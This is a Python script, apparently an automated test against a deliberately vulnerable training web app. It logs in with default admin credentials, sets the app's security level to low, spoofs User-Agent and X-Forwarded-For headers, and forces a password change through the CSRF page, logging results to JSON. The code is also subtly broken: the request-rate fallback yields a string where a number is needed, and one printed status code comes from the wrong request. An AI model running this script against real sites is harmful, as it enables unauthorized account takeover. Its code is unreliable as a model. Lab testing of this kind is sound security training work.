import requests
from bs4 import BeautifulSoup
from datetime import datetime
from pathlib import Path
import os
import json
import sys
import time

# Setup directories and session
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)
session = requests.Session()

if len(sys.argv) > 2:
    base_url = sys.argv[1]
    request_rate = sys.argv[2]
else:
    print("Base URL and/or request rate were not provided.")
    sys.exit(1)

delays = {'low': 15, 'medium': 2, 'high': 0.5}
delay = delays.get(request_rate, 'medium')

csrf_url = f"{base_url}/vulnerabilities/csrf/"
login_url = f"{base_url}/login.php"

# Headers to spoof User-Agent and IP address
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'X-Forwarded-For': '192.168.1.1'
}
# Construct the target URL for brute force attacks
target_url = f"{base_url}/vulnerabilities/brute/"
login_url = f"{base_url}/login.php"
security_url = f"{base_url}/security.php"

def login_and_setup_security():
    #response = session.get(login_url)
    data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
    }
    response = session.post(login_url, data=data, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
    time.sleep(delay) 
    
    #response = session.get(security_url)
    data = {
        'security': 'low',
        'seclev_submit': 'Submit',
        'user_token': user_token
    }
    session.post(security_url, data=data, headers=headers)
    time.sleep(delay) 

def csrf_attack():
    total_tests = 0
    tests_passed = 0
    tests_failed = 0
    details = []  # List to store result details for each command

    # Get CSRF page for initial CSRF token
    response = session.get(csrf_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'}).get('value')

    # Prepare the data for the CSRF attack (changing the password)
    data = {
        'password_new': 'newpassword123',
        'password_conf': 'newpassword123',
        'Change': 'Change',
        'user_token': user_token
    }
    total_tests += 1
    post_response = session.post(csrf_url, data=data, headers=headers)
    response_code = post_response.status_code
    success_condition = (200 <= response_code < 300)

    if success_condition:
        tests_passed += 1
        result_status = f"PASSED - password changed successfully ! Response Code: {response_code}"
    else:
        tests_failed += 1
        result_status = f"FAILED - Response Code not 200, got {response_code}"
    print(f"User Token: {user_token}\nResult Status: {result_status}\nResponse Code: {response.status_code}")
    time.sleep(delay)
    
    # Add command result details to the list
    details.append({
        "Token":user_token ,
        "response_code": response_code,
        "status": result_status
    })

    # Log the results
    script_name = os.path.splitext(os.path.basename(__file__))[0]
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"results_{script_name}_{timestamp}.json"
    results_file = logs_dir / file_name
    result_summary = {
        'date_time': timestamp,
        'base_url': base_url,
        'total_tests': total_tests,
        'tests_passed': tests_passed,
        'tests_failed': tests_failed,
        'tested_url': csrf_url,
        'details': details  # Include detailed command results in the JSON output
    }
    
    with open(results_file, 'w') as f:
        json.dump(result_summary, f, indent=4)
    print(f"Results saved to {results_file}")

if __name__ == "__main__":
    login_and_setup_security()
    csrf_attack()